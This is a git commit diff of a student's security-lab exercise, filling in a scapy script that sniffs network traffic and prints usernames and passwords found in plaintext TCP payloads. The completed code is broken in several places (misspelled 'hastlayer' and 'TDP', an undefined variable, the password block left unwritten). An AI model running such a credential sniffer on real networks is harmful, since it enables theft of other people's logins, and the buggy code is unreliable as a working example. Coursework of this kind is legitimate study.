433e1770ddc7237f04422416153e37928f83568e
Micah Swindell <mjs87@students.uwf.edu>
2022-11-16 12:55:13 -0600

    Updated password_sniffer.py with information from class

--- lab_11/password_sniffer.py
+++ lab_11/password_sniffer.py
@@ -2,21 +2,21 @@ from scapy.all import *
 from urllib import parse
 import re
 
-iface = # your computer's sniffing interface name
+iface = sad # your computer's sniffing interface name
 
 def get_login_pass(body):
     user = None
     passwd = None
     
     userfields = ['login', 'user', 'uname', 'username', 'nickname', 'userid', 'login_id', 
-'sessionkey', 'session_key', 'uname']
+    'sessionkey', 'session_key', 'uname']
     
     passfields = ['password', 'passphrase', 'pass', 'passwd']
     
     for login in userfields:
-      login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
-      if login_re:
-        user = login_re.group()
+        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
+        if login_re:
+            user = login_re.group()
     
     ## Repeat the same block of code above for the password field
     ## -------------
@@ -24,34 +24,45 @@ def get_login_pass(body):
     ## -------------
     
     if user and passwd:
-      # return both
-      ## -------------
-      ## Your code goes here
-      ## -------------
+        # return both
+        ## -------------
+        return (user, passwd)
+        ## -------------
 
       
       
-  def pkt_parser(packet):
+def pkt_parser(packet):
     try:
         ## if packet.haslayer is TCP and Raw and IP
             ## store TCP payload in a variable
-            ## call the get_login_pass function and pass the variable, store the return 
-value in a variable as a list
+            ## call the get_login_pass function and pass the variable, 
+            ## store the return value in a variable as a list
             ## check if the return value is not empty and
                 ## print TCP payload
                 ## print(parse.unquote(variable[0])) for username
                 ## print(parse.unquote(variable[1])) for password
         ## else:
-            pass
+            ## pass
     ## --------------
-    ## Your code goes here
+        if packet.haslayer(TCP) and packet.haslayer(IP) and packet.hastlayer(Raw):
+            body = str(packet[TCP].payload)
+            user_pass = get_login_pass(body)
+            if user_pass != None:
+                print(packet[TDP].payload)
+                print(parse.unquote(variable[0]))
+                print(parse.unquote(variable[1]))
+            else:
+                pass
+        else:
+            pass
+    except:
+        pass
     ## ---------------
-    
-    
-    
-main():
+
+def main():
     try:
         sniff(iface=iface, prn=pkt_parser, store=0)
+
     except KeyboardInterrupt:
         print('Exiting..')
         exit()
